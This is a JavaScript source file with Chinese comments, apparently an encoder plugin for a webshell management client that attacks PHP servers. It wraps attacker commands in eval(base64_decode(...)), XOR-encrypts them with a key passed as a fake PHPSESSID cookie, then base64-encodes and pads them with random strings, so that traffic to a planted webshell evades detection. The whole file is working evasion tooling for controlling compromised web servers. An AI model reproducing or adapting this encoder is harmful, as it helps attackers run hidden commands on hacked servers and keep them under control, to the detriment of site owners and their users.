/**
 * php::base64编码器
 * Create at: 2020/11/19 21:20:31
 *lnng.top
 */

'use strict';


module.exports = (pwd, data, ext = {}) => {
  let randomID = `x${Math.random().toString(16).substr(2)}`;

  function xor(payload) {
    let crypto = require('crypto');
    let key = crypto.createHash('md5').update(randomID).digest('hex').substr(6);
    ext.opts.httpConf.headers['Cookie'] = 'PHPSESSID=' + key;
    key = key.split("").map(t => t.charCodeAt(0));
    //let payload="phpinfo();";
    let cipher = payload.split("").map(t => t.charCodeAt(0));
    for (let i = 0; i < cipher.length; i++) {
      cipher[i] = cipher[i] ^ key[i % 26]
    }
    cipher = cipher.map(t => String.fromCharCode(t)).join("")
    cipher = Buffer.from(cipher).toString('base64');
    //console.log(cipher)
    return cipher;
  }

  data['_'] = Buffer.from(data['_']).toString('base64');
  
  // 生成一个随机变量名
  let num =  Math.floor(Math.random()*15);
  let randomStr = `${Math.random().toString(16).substr(num)}`;
  //data['password'] = 15-num;
  
  //data[pwd] = `eval(base64_decode("${data['_']}"));`;
  //data[pwd]=xor(data[pwd]);
  //data[pwd] = `${randomStr}` + data[pwd] + `${randomStr}`;
  
  let ret = {};
  for (let _ in data) {
    if (_ === '_') { continue };
    //if (_ === 'num') { continue };
    //if (_ === 'password') { continue };
    ret[_] = Buffer.from(data[_]).toString('hex');
    //ret[_] = Buffer.from(data[_]);
  }
  //ret[password] = data['password'].toString('hex');
  ret['password'] = 15-num;
  ret[pwd] = `eval(base64_decode("${data['_']}"));`;
  ret[pwd] = xor(ret[pwd]);
  ret[pwd] = `${randomStr}` + ret[pwd] + `${randomStr}`
  //ret[pwd] = ret[pwd].toString('hex');
  return ret;
  //删除原有payload
  //delete data['_'];
 //返回编码器处理后的payload数组
  //return data;
}
